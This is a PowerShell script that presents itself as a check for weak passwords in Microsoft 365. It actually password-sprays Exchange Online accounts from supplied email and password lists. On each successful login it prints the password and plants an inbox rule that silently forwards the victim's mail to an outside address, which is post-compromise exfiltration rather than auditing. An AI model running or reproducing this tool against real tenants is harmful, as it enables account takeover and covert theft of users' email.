########################################################################################################################################################################################################################
# Powershell Script to Identify accounts suceptible to weak password in M365 to By: 41ph4-01 23/04/2024 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################


# Path to the file containing email addresses
$emailAddressesFile = "email_addresses.txt"

# Path to the file containing passwords
$passwordsFile = "passwords.txt"

# Load email addresses and passwords into arrays
$emailAddresses = Get-Content $emailAddressesFile
$passwords = Get-Content $passwordsFile

# Set the maximum number of attempts per user
$maxAttemptsPerUser = 2

# Specify the email address to forward messages to
$forwardTo = "forwarding@example.com"

# Define the base OAuth 2.0 authorisation URL
$baseAuthUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# Define the client ID and redirect URI
$clientId = "4765445b-32c6-49b0-83e6-1d93765276ca"
$redirectUri = "https://www.office.com/landingv2"

# Define other query parameters
$responseType = "code id_token"
$scope = "openid profile https://www.office.com/v2/OfficeHome.All"
$responseMode = "form_post"
$nonce = "638728133397784705.ZDg1YTA0NGQtMDdiYi00Zjg0LWFjYmUtMDg4MWY0MzYzZDNlYzc5MzNmYjAtZTRlMS00OTI1LTg3ZjItZDIyMTIyYWE1NjM2"
$uiLocales = "en-GB"
$mkt = "en-GB"
$clientRequestId = "78b116a9-4622-44ef-95b2-9409c13abfdd"
$state = "c4S5umnqbeOt-Kc107nqz5_mpYXX2C-nM7oZDJBCwzSg4yHd3gdtX5uEEXkvb3pBa7QRhdgmVfHW4mel6v-8-R0h1P5kBAm9L-GgVZZzNchNo1Tgnn-y9i0YyvM1KNrvvaCxqLzWRhajmx7xfLVyjF9hR8uvgF33Xfm9cpotrtMgRlEO-XJOnkrlcgp611AZIe9_4zHnHRvDgprk1arremKdqbRaPxdP4KJcQTgpt7CgjlJiwmoR85Uc_Ub9kbg0zRbTYKMfCbfYdrlMv-yENg3QOL3I43KsgRp-6Sk8nHw"
$xClientSKU = "ID_NET8_0"
$xClientVer = "7.5.1.0"

# Loop through each email address (UPN)
foreach ($emailAddress in $emailAddresses) {
    # Counter for the number of attempts for the current user
    $attempts = 0
    
    # Extract the domain from the email address
    $domain = $emailAddress.Split('@')[1]

    # Construct the authentication URL
    $authUrl = "$baseAuthUrl?client_id=$clientId&redirect_uri=$redirectUri&response_type=$responseType&scope=$scope&response_mode=$responseMode&nonce=$nonce&ui_locales=$uiLocales&mkt=$mkt&client-request-id=$clientRequestId&state=$state&x-client-SKU=$xClientSKU&x-client-ver=$xClientVer"
    
    Write-Host "Authentication URL for $emailAddress: $authUrl"

    # Loop through each password
    foreach ($password in $passwords) {
        # Attempt login using current email address (UPN) and password
        $credentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $emailAddress, (ConvertTo-SecureString -String $password -AsPlainText -Force)
        $result = Try {
            # Connect to Exchange Online using implicit authentication
            Connect-ExchangeOnline -Credential $credentials
            $true  # Authentication successful
        } Catch {
            $false  # Authentication failed
        }

        # Increment attempts counter
        $attempts++

        # Check if login was successful or if maximum attempts reached
        if ($result) {
            Write-Host "Login successful for $emailAddress with password $password"

            # Set up forwarding rule
            $ruleName = "Forwarding Rule"
            $mailbox = Get-Mailbox -Identity $emailAddress
            New-InboxRule -Mailbox $mailbox.UserPrincipalName -Name $ruleName -ForwardTo $forwardTo -StopProcessingRules $true -DeleteMessage $false
            Write-Host "Forwarding rule set up for $emailAddress to forward to $forwardTo"
            
            break  # Break out of password loop if login successful
        } elseif ($attempts -ge $maxAttemptsPerUser) {
            Write-Host "Maximum attempts reached for $emailAddress"
            break  # Break out of password loop if maximum attempts reached
        } else {
            Write-Host "Login failed for $emailAddress with password $password"
        }
    }
}
